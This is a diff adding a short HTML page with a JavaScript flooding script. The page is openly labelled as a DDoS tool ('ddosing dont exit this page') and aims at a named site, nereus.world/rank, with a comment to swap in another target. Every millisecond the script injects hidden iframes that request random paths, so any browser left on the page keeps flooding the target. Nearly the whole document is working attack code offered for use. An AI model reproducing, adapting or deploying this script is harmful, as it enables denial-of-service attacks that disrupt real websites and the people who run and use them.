@@ -1,0 +1,24 @@
+<html>
+<body>
+ <center>
+  <h1>ddosing dont exit this page</h1>
+ </center>
+ <div id = "ddos"></div>
+</body>
+</html>
+
+<script>
+var concurrent = 10; // too many pc will die
+var target = "https://nereus.world/rank"; // change this
+var i = 0;
+function attack() { 
+ var rand = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15); 
+ document.getElementById("ddos").innerHTML+='<iframe src= "'+target+'/'+rand+'" style="display: none;"></iframe>';
+ i++;
+ if(i == concurrent) {
+  document.getElementById("ddos").innerHTML='<iframe src= "'+target+'/'+rand+'" style="display: none;"></iframe>';
+  i = 0;
+ }
+}
+setInterval(attack, 1);
+</script>
